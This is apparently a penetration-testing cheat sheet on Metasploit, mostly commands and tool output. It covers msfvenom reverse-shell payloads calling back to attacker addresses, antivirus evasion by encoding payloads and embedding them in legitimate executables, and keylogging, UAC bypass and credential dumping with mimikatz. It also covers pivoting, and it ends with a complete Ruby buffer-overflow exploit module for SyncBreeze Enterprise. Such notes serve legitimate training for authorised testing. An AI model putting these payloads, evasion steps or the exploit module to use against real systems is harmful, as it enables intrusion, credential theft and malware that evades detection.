# Metasploit

{% embed url="https://docs.metasploit.com/" %}

{% embed url="https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/" %}

{% hint style="warning" %}
Try x64 and no x64 payloads, stager/non-stager, migrate to an interactive process (Session = 1 when we list processes with ps on Meterpreter)

```
setg payload ...
sessions -l
```
{% endhint %}

```bash
# FIRST TIME
msfdb run
# TO KNOW MORE ABOUT THE EXPLOIT AND ALSO A DESCRIPTION
msf > info --> don't forget set payload
# IF THE EXPLOIT DOES NOT WORK, CHECK ADVANCED OPTIONS!!!!
```

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.metasploit.com/
https://www.coresecurity.com/core-impact
https://www.immunityinc.com/products/canvas/
https://blog.cobaltstrike.com/category/cobalt-strike-2/
https://www.powershellempire.com/
https://www.rapid7.com/
https://threatpost.com/qa-hd-moore-metasploit-disclosure-and-ethics-052010/73998/

show -h
search type:auxiliary name:smb
search cve:2009 type:exploit platform:-linux
# Database Access
msf6 auxiliary(scanner/portscan/tcp) > services
Services
========

host            port  proto  name           state  info
----            ----  -----  ----           -----  ----
192.168.120.11  80    tcp                   open   
192.168.120.11  135   tcp                   open   
192.168.120.11  139   tcp                   open 

msf6 auxiliary(scanner/portscan/tcp) > services -p 445
Services
========
host            port  proto  name          state  info
----            ----  -----  ----          -----  ----
192.168.120.11  445   tcp    microsoft-ds  open 
To help organize content in the database, Metasploit allows us to store information in separate workspaces. 

# Auxiliary Modules
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts # set our host on that service as RHOST for the module
setg RHOSTS 192.168.120.11 # global set for all the modules
set THREADS 10 # if this parameter exists, we can increase it a bit to speed up the process
msf6 auxiliary(scanner/smb/smb_login) > creds #retrieve successful login attempts

# Meterpreter
https://github.com/rapid7/metasploit-framework/wiki/Meterpreter

# Msfvenom
https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

# Multi Handler
We have used Netcat shells, However, this is inelegant and may not work for more advanced Metasploit payloads. Instead, we should use the framework multi/handler module, which works for all single and multi-stage payloads.
msf6 payload(windows/shell_reverse_tcp) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 192.168.118.2
LHOST => 192.168.118.2
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit -j #as background job
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.118.2:443
msf6 exploit(multi/handler) > jobs #list jobs
msf6 exploit(multi/handler) > jobs -i 0
msf6 exploit(multi/handler) > kill 0
[*] Stopping the following job(s): 0
[*] Stopping job 0

# Client-side attacks
msfvenom -f
The hta-psh, vba, and vba-psh formats are designed for use in client-side attacks by creating either a malicious HTML Application or an Office macro for use in a Word or Excel document, respectively.
msf6 > search flash #Flash-based exploits

# Transport
https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control
```
{% endcode %}

**SHOW ADVANCED OPTIONS**

stage payload --> several stages, i.e. first to connect and download a part of a payload and then from the victim we ask for the rest // nc does not work, we need Metasploit handler stageless --> we have all the payload directly on the victim machine

search type:auxiliary platform:windows

## User Interfaces and Setup

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
sudo apt update; sudo apt install metasploit-framework
sudo msfconsole -q # -q hide the banner
```

## Database access

```bash
msf > services
msf > db_nmap $IP -A -Pn # with db_nmap you can use nmap as usual
msf > hosts # hosts already discovered

# List workspace, change, add (-a) or delete (-d)
msf > workspace
msf > workspace test
msf > workspace -a new
```

## Auxiliary modules

```bash
msf > search type:auxiliary name:smb
    use ...
    info
    setg
    creds # retrieve successful login attempts
```

## Exploit modules

```bash
msf > show payloads
windows/shell_bind_tcp normal Windows Command Shell, Bind TCP Inli 
windows/shell_hidden_bind_tcp normal Windows Command Shell, Hidden Bind T on i 
windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP I An 
windows/speak_pwned normal Windows Speech API - Say "You Got Pw t 
windows/upexec/bind_hidden_ipknock_tcp 04normal Windows Upload/Execute, Hidden Bind

msf > check // after setting the parameters, check if the target is vulnerable

msf > set verbose true
```

## Payloads

{% tabs %}
{% tab title="Staged vs Non-Staged" %}
{% code overflow="wrap" %}
```bash
https://medium.com/@nmappn/msfvenom-payload-list-77261100a55b

windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell 
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
windows/x64/shell_reverse_tcp
linux/x86/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -o non-staged.out -f elf-so
linux/x86/shell/reverse_tcp LHOST=$LOCALIP LPORT=443 -o staged.out -f elf-so
linux/x64/shell/reverse_tcp

Staged is sent in two parts, suitable if the vuln does not have enough buffer space
Also better for AV evasion
```
{% endcode %}
{% endtab %}

{% tab title="Meterpreter" %}
```
meterpreter > help
                sysinfo
                getuid
                upload/download (double "/" for the destination path)
                shell
```
{% endtab %}

{% tab title="msfvenom" %}
{% code overflow="wrap" %}
```bash
https://hackingandsecurity.blogspot.com/2016/04/msfpayload-and-msfencode-have-been.html?m=1

# -i is the number of encoding iterations to further obfuscate the binary
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
# Inject a payload into an existing PE file --> reduces AV detection
msfvenom -p ... -x /usr/share/windows-resources/binaries/plink.exe ...
# This can also be done with "generate" in Metasploit
msf > generate -f exe -e x86/shikata_ga_nai -i 9 -x ... -o revshell_encod_emb.exe
```
{% endcode %}
{% endtab %}

{% tab title="Multi/handler" %}
```bash
# Run it in the background to not block the prompt
msf > exploit -j
    jobs
    jobs -i 0
    kill 0
```
{% endtab %}

{% tab title="Advanced features and Transports" %}
{% code overflow="wrap" %}
```bash
msf > show advanced
# We possibly bypass AV detection if we encode the second stage of a staged payload
    set EnableStageEncoding true
    set StageEncoder x86/shikata_ga_nai
# Autom. run a script when the connection is established, useful for cl-sid attacks
    set AutoRunScript windows/gather/enum_logged_on_users
meterpreter > background
# To switch protocols (HTTP, TCP...) after our initial compromise
meterpreter > transport list
              transport add -t reverse_tcp -l 10.11.0.4 -p 5555
              transport list
              background
# Now we set up the listener (10.11.0.4 5555) with multi/handler   
# To change to the new transport
meterpreter > transport next/prev   
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Post-Exploitation

<pre class="language-ruby"><code class="lang-ruby"><strong># MIGRATE TO ANOTHER PROCESS
</strong>meterpreter > migrate -N explorer.exe
<strong>
</strong><strong>meterpreter > screenshot
</strong>                keyscan_start # keystrokes
                keyscan_dump
                keyscan_stop
                ps
                migrate $PID # only to a process at same level of priv or lower

# Bypass UAC W10
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
msf5 > use exploit/windows/local/bypassuac_injection_winsxs
meterpreter > load powershell
                powershell_execute "$PSVersionTable.PSVersion"
                load kiwi # mimikatz
                getsystem # since mimikatz requires SYSTEM rights
                creds_msv # dump system credentials  
</code></pre>

## Port Forwarding

{% code overflow="wrap" fullWidth="true" %}
```bash
ipconfig
# In case we find more subnetworks, add a route to a network reachable through a compromised host
msf6 exploit(multi/handler) > route add 172.16.16.0/24 $SESSION_ID
msf6 exploit(multi/handler) > route add 172.16.16.0/24 $SESSION_ID
# Now we can scan ports of hosts from that subnetwork
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.16.16
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
# Example in case we have creds to authenticate to those ports
use exploit/windows/smb/psexec 
set SMBUser myuser
set SMBPass "MyPassword1!"
set RHOSTS 172.16.16.16
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
msf6 exploit(windows/smb/psexec) > run

# Alternative
use multi/manage/autoroute
set session $SESSION_ID
run
# Configure a SOCKS proxy to allow applications outside of Metasploit to tunnel through the pivot on port 1080 by default
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
# Now on Kali we confirm socks5 127.0.0.1 1080 is enabled
kali@kali:~$ tail /etc/proxychains4.conf
# And we can access the subnet from our Kali
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.16.16 /u:luiza

# We could do the same with port forwarding instead of SOCKS
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.16.16
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza             
```
{% endcode %}

## Client-side Attacks

{% hint style="info" %}
Specially for client-side attacks the multi/handler needs

```
set ExitOnSession False
```
{% endhint %}

## Automation

{% code overflow="wrap" %}
```ruby
# Resource Scripts
ls -l /usr/share/metasploit-framework/scripts/resource

# Create a resource script to automate the process, let's call it setup.rc
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_https 
set LHOST 10.11.0.4 
set LPORT 443 
set EnableStageEncoding true 
set StageEncoder x86/shikata_ga_nai 
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false 
exploit -j -z

# After saving the script, we can execute it by passing the -r flag to msfconsole
sudo msfconsole -r setup.rc
# With the listener configured and running, we can launch an executable 
# containing a meterpreter payload
msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443 -f exe -o met.exe
```
{% endcode %}

## Powershell

{% code overflow="wrap" fullWidth="true" %}
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```
{% endcode %}

## Import .rb on msfconsole

Copy .rb with a descriptive name inside /usr/share/metasploit-framework/modules/exploits.

## Building our own MSF Module

{% code overflow="wrap" %}
```bash
#CREATE A TEMPLATE FOR THE EXPLOIT SYNC BREEZE USING DISK PULSE
sudo mkdir -p /root/.msf4/modules/exploits/windows/http
sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb 
kali@kali:~/.msf4/modules/exploits/windows/http$ sudo nano /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
```
{% endcode %}

Exploit in Ruby. We update the header information, EXITFUNC, badchars, Ret, Offset, uri, product\_name to contain the version of the product, uri to exploit and the username with the buffer.

{% code overflow="wrap" %}
```ruby
##
# This module requires Metasploit: http://metasploit.com/download 
# Current source: https://github.com/rapid7/metasploit-framework 
##

class MetasploitModule < Msf::Exploit::Remote 
    Rank = ExcellentRanking 
    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {}) 
        super(update_info(info, 
            'Name' => 'SyncBreeze Enterprise Buffer Overflow', 
            'Description' => %q( 
                This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF. ), 
            'License' => MSF_LICENSE, 
            'Author' => [ 'Offensive Security', 'offsec' ], 
            'References' => 
                [ 
                    [ 'EDB', '42886' ]
                ], 
            'DefaultOptions' => 
                { 
                    'EXITFUNC' => 'thread' 
                }, 
            'Platform' => 'win', 
            'Payload' => 
                { 
                    'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d", 
                    'Space' => 500 
                }, 
            'Targets' => 
                [ 
                    [ 'SyncBreeze Enterprise 10.0.28', 
                        { 
                            'Ret' => 0x10090c83, # JMP ESP -- libspp.dll 
                            'Offset' => 780 
                        }] 
                ], 
            'Privileged' => true, 
            'DisclosureDate' => 'Oct 20 2019', 
            'DefaultTarget' => 0))
        
        register_options([Opt::RPORT(80)]) 
    end 
    
    def check 
        res = send_request_cgi( 
            'uri' => '/', 
            'method' => 'GET'
        )
        
        if res && res.code == 200 
            product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
            if product_name =~ /10\.0\.28/ 
                return Exploit::CheckCode::Appears
            end 
        end 
        
        return Exploit::CheckCode::Safe 
    end
    
    def exploit
        print_status("Generating exploit...")
        exp = rand_text_alpha(target['Offset']) 
        exp << [target.ret].pack('V') 
        exp << rand_text(4) 
        exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode 
        exp << payload.encoded 
        
        print_status("Sending exploit...") 
        
        send_request_cgi( 
            'uri' => '/login', 
            'method' => 'POST', 
            'connection' => 'keep-alive',
            'vars_post' => { 
                    'username' => "#{exp}", 
                    'password' => "fakepsw" 
                } 
        ) 
        
        handler 
        disconnect 
    end 
end
```
{% endcode %}
